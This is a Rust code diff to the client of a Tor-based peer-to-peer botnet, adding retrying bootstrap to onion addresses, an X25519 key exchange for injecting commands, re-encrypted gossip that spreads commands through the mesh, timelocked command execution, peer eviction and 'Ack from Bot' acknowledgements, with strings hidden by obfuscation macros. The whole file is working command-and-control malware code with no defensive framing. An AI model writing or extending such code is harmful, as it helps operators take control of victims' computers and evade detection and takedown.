@@ -70,19 +70,22 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
     println!("{}", obfstr!("Registering with Bootstrap Swarm (Failover Mode)..."));
     
     let mut bootstrap_success = false;
-    for onion_addr in BOOTSTRAP_ONIONS.iter() {
-        println!("{}: {}", obfstr!("Attempting Bootstrap"), onion_addr);
-        if let Ok(_) = register_via_tor(&tor_client, &state, onion_addr, &my_pub_hex, &my_onion, &identity.keypair).await {
-            println!("{}: {}", obfstr!("Bootstrap Success via"), onion_addr);
-            bootstrap_success = true;
-            break;
-        } else {
-            eprintln!("{}: {}", obfstr!("Bootstrap Failed via"), onion_addr);
+    while !bootstrap_success {
+        for onion_addr in BOOTSTRAP_ONIONS.iter() {
+            println!("{}: {}", obfstr!("Attempting Bootstrap"), onion_addr);
+            if let Ok(_) = register_via_tor(&tor_client, &state, onion_addr, &my_pub_hex, &my_onion, &identity.keypair).await {
+                println!("{}: {}", obfstr!("Bootstrap Success via"), onion_addr);
+                bootstrap_success = true;
+                break;
+            } else {
+                eprintln!("{}: {}", obfstr!("Bootstrap Failed via"), onion_addr);
+            }
         }
-    }
-    
-    if !bootstrap_success {
-        eprintln!("{}", obfstr!("CRITICAL: All Bootstrap Nodes Unreachable."));
+        
+        if !bootstrap_success {
+            eprintln!("{}", obfstr!("CRITICAL: All Bootstrap Nodes Unreachable. Retrying in 60s..."));
+            time::sleep(Duration::from_secs(60)).await;
+        }
     }
 
     let state_clone = state.clone();
@@ -153,6 +156,9 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
     }
 }
 
+use x25519_dalek::{EphemeralSecret, PublicKey};
+use rand_core::OsRng;
+
 async fn handle_inbound_connection(
     stream: arti_client::DataStream, 
     state: Arc<RwLock<MeshState>>, 
@@ -163,17 +169,43 @@ async fn handle_inbound_connection(
         Err(_) => return, // Connection handshake failed
     };
     
+    let mut session_key: Option<Vec<u8>> = None;
+    
     // Inbound Connection Handling
     // If a neighbor connects, we process their messages.
-    // ActivePool will handle outbound reuse if we reply.
     
     while let Some(msg) = ws_stream.next().await {
         if let Ok(Message::Text(text)) = msg {
             // V10 Protocol: Try to parse generic MeshMsg first
             if let Ok(mesh_msg) = serde_json::from_str::<MeshMsg>(&text) {
                 match mesh_msg {
+                    MeshMsg::ClientHello { ephemeral_pub } => {
+                        // 1. Generate My Ephemeral Key
+                        let mut rng = OsRng;
+                        let my_secret = EphemeralSecret::random_from_rng(&mut rng);
+                        let my_public = PublicKey::from(&my_secret);
+                        
+                        // 2. Derive Shared Secret
+                        if let Ok(peer_bytes) = hex::decode(ephemeral_pub) {
+                            let peer_arr_res: Result<[u8; 32], _> = peer_bytes.try_into();
+                            if let Ok(peer_arr) = peer_arr_res {
+                                let peer_public = PublicKey::from(peer_arr);
+                                let shared_secret = my_secret.diffie_hellman(&peer_public);
+                                session_key = Some(shared_secret.as_bytes().to_vec());
+                                
+                                // 3. Reply ServerHello
+                                let resp = MeshMsg::ServerHello { 
+                                    ephemeral_pub: hex::encode(my_public.as_bytes()) 
+                                };
+                                let resp_json = serde_json::to_string(&resp).unwrap_or_default();
+                                let _ = ws_stream.send(Message::Text(resp_json.into())).await;
+                                println!("{}", obfstr!("Handshake Success. Session Key Established."));
+                            }
+                        }
+                    },
                     MeshMsg::Gossip(gossip) => {
-                         handle_gossip(state.clone(), gossip, &tor).await;
+                         // Pass session_key if present
+                         handle_gossip(state.clone(), gossip, &tor, session_key.as_deref()).await;
                     },
                     MeshMsg::FindBot { target_id } => {
                          // Reply with closest peers
@@ -186,18 +218,16 @@ async fn handle_inbound_connection(
                          let _ = ws_stream.send(Message::Text(resp_json.into())).await;
                     },
                     MeshMsg::FoundBot { nodes } => {
-                        // Add to DHT
-                         let mut guard = state.write().await;
                          for node in nodes {
-                             guard.dht.insert(node);
+                             insert_node_safe(state.clone(), tor.clone(), node).await;
                          }
                     },
-                    _ => {} // Register/GetPeers handled by Bootstrap not Node
+                    _ => {} 
                 }
             } 
             // Fallback / Legacy (Direct GossipMsg)
             else if let Ok(gossip) = serde_json::from_str::<GossipMsg>(&text) {
-                 handle_gossip(state.clone(), gossip, &tor).await;
+                 handle_gossip(state.clone(), gossip, &tor, None).await;
             }
         }
     }
@@ -242,10 +272,10 @@ async fn register_via_tor(
     
     if let Some(Ok(Message::Text(resp_text))) = ws_stream.next().await {
         if let Ok(MeshMsg::Peers(peers)) = serde_json::from_str::<MeshMsg>(&resp_text) {
-            let mut guard = state.write().await;
             for p in peers {
-                guard.dht.insert(p);
+                insert_node_safe(state.clone(), tor.clone(), p).await;
             }
+            let guard = state.read().await;
             println!("{}: {} {}", obfstr!("Bootstrap Success. DHT Initialized with"), guard.dht.all_peers().len(), obfstr!("peers."));
         }
     }
@@ -253,7 +283,7 @@ async fn register_via_tor(
     Ok(())
 }
 
-async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorClient<PreferredRuntime>) {
+async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorClient<PreferredRuntime>, session_key_override: Option<&[u8]>) {
     // 1. Check Cache
     let mut is_seen = false;
     {
@@ -266,60 +296,88 @@ async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorC
     let swarm_key_hex = env!("SWARM_KEY");
     let swarm_key = hex::decode(swarm_key_hex).unwrap_or(vec![0u8; 32]);
     
+    // Determine which key to use for decryption
+    let decryption_key = session_key_override.unwrap_or(&swarm_key);
+    
     // 2. Decrypt & Exec
-    if let Some(cmd) = packet_verify_and_decrypt(&msg.packet, &swarm_key) {
+    if let Some(cmd) = packet_verify_and_decrypt(&msg.packet, decryption_key) {
         // Secure Time Check (NTP)
         let now = get_secure_time().await;
         
         // Allow 30s drift
         if cmd.execute_at <= now + 30 {
              process_command(&cmd);
+             if let Some(reply_to) = &cmd.reply_to {
+                 let t = tor.clone();
+                 let r = reply_to.clone();
+                 let i = cmd.id.clone();
+                 tokio::spawn(async move {
+                     send_ack(&t, &r, &i, "Executed").await;
+                 });
+             }
         } else {
              println!("{}: {}", obfstr!("Timelocked"), cmd.execute_at);
+             let reply_to = cmd.reply_to.clone();
+             let t = tor.clone();
+             let i = cmd.id.clone();
+             let cmd_clone = cmd.clone();
              tokio::spawn(async move {
-                 let wait_s = if cmd.execute_at > now { (cmd.execute_at - now) as u64 } else { 0 };
+                 let wait_s = if cmd_clone.execute_at > now { (cmd_clone.execute_at - now) as u64 } else { 0 };
                  time::sleep(Duration::from_secs(wait_s)).await;
-                 process_command(&cmd);
+                 process_command(&cmd_clone);
+                 if let Some(r) = reply_to {
+                     send_ack(&t, &r, &i, "Executed").await;
+                 }
              });
+        }
+        
+        // 3. Propagation (Gossip + DHT)
+        if msg.ttl > 0 {
+            // Re-Encrypt if we used a specific Session Key (Injection)
+            let packet_to_send = if session_key_override.is_some() {
+                // Re-Encrypt with Swarm Key for neighbors
+                use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit, AeadCore};
+                use chacha20poly1305::aead::Aead; // Import Trait
+                use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
+                
+                let cipher = ChaCha20Poly1305::new(Key::from_slice(&swarm_key));
+                let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
+                let json = serde_json::to_string(&cmd).unwrap(); // Plaintext
+                let ciphertext = cipher.encrypt(&nonce, json.as_bytes()).expect("Re-Encryption Failed");
+                
+                GhostPacket {
+                    ciphertext: BASE64.encode(ciphertext),
+                    nonce: BASE64.encode(nonce),
+                    signature: msg.packet.signature.clone(), // Reuse Sig (Valid for Plaintext)
+                }
+            } else {
+                msg.packet.clone() // Forward as is
+            };
+
+            let targets = {
+                let guard = state.read().await;
+                guard.dht.all_peers()
+            };
+            
+            let selected = select_gossip_target_list(targets);
+            println!("{}: {} {}", obfstr!("Gossip Fanout"), selected.len(), obfstr!("peers"));
+            
+            let next_msg = GossipMsg { 
+                id: msg.id,
+                packet: packet_to_send,
+                ttl: msg.ttl - 1 
+            };
+            let msg_str = serde_json::to_string(&next_msg).unwrap();
+            
+            let mut guard = state.write().await;
+            let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
+            
+            for target_peer in selected {
+                let _ = guard.pool.send_msg(tor, &target_peer.onion_address, msg_str.clone(), &neighbors).await;
+            }
         }
     } else {
         return; // Invalid
-    }
-
-    // 3. Propagation (Gossip + DHT)
-    if msg.ttl > 0 {
-        let targets = {
-            let guard = state.read().await;
-            // DHT Logic: Get closest peers to ME? Or random?
-            // Gossip usually random or close?
-            // "Lan truyền lệnh ... qua các đường ống có sẵn".
-            // Report says: Entry Bot uses its 10 neighbors (K-Bucket).
-            // We use DHT to select peers.
-            // If we gossip to EVERYONE in our bucket?
-            guard.dht.all_peers()
-        };
-        
-        // Filtering: 30% or 100% logic
-        // Use the select_targets logic but adapted
-        let selected = select_gossip_target_list(targets);
-        println!("{}: {} {}", obfstr!("Gossip Fanout"), selected.len(), obfstr!("peers"));
-        
-        let next_msg = GossipMsg { ttl: msg.ttl - 1, ..msg };
-        let msg_str = serde_json::to_string(&next_msg).unwrap();
-        
-        // Use ActivePool (Smart Send)
-        let mut guard = state.write().await;
-        
-        // Anti-Eviction: Protect Neighbors
-        // We get ALL peers from DHT as "Neighbors" to protect.
-        // Collecting inside the lock is perfectly fine (Vec copy).
-        // Since we hold the lock, dht is accessible.
-        let neighbors: Vec<String> = guard.dht.all_peers().iter().map(|p| p.onion_address.clone()).collect();
-        
-        for target_peer in selected {
-            // Smart Send with Whitelist
-            let _ = guard.pool.send_msg(tor, &target_peer.onion_address, msg_str.clone(), &neighbors).await;
-        }
     }
 }
 
@@ -496,5 +554,60 @@ fn solve_pow(pub_key: &str) -> u64 {
             return nonce;
         }
         nonce += 1;
+    }
+}
+
+async fn insert_node_safe(state: Arc<RwLock<MeshState>>, tor: TorClient<PreferredRuntime>, new_peer: PeerInfo) {
+    let action = {
+        let mut guard = state.write().await;
+        guard.dht.insert(new_peer.clone())
+    };
+    
+    if let crate::p2p::dht::InsertResult::BucketFull(old) = action {
+        tokio::spawn(async move {
+            if !check_alive(&tor, &old.onion_address).await {
+                let mut guard = state.write().await;
+                guard.dht.evict_and_insert(&old.onion_address, new_peer);
+            }
+        });
+    }
+}
+
+async fn check_alive(tor: &TorClient<PreferredRuntime>, onion: &str) -> bool {
+    let target_host = if let Some(idx) = onion.find(':') {
+        &onion[0..idx]
+    } else {
+        onion
+    };
+    let target_port = 80; // Default Mesh Port
+    
+    // Just try to connect
+    match tor.connect((target_host.to_string(), target_port)).await {
+        Ok(_) => true,
+        Err(_) => false,
+    }
+}
+
+async fn send_ack(tor: &TorClient<PreferredRuntime>, target_onion: &str, cmd_id: &str, status: &str) {
+    let target_host = if let Some(idx) = target_onion.find(':') {
+        &target_onion[0..idx]
+    } else {
+        target_onion
+    };
+    let target_port = 80;
+
+    if let Ok(stream) = tor.connect((target_host.to_string(), target_port)).await {
+        let url = format!("ws://{}/ack", target_onion);
+        if let Ok((mut ws_stream, _)) = client_async(url, stream).await {
+             let ack = MeshMsg::Ack(protocol::AckPayload {
+                 command_id: cmd_id.to_string(),
+                 status: status.to_string(),
+                 details: obfstr!("Ack from Bot").to_string(),
+             });
+             if let Ok(json) = serde_json::to_string(&ack) {
+                 let _ = ws_stream.send(Message::Text(json.into())).await;
+                 let _ = ws_stream.close(None).await;
+             }
+        }
     }
 }
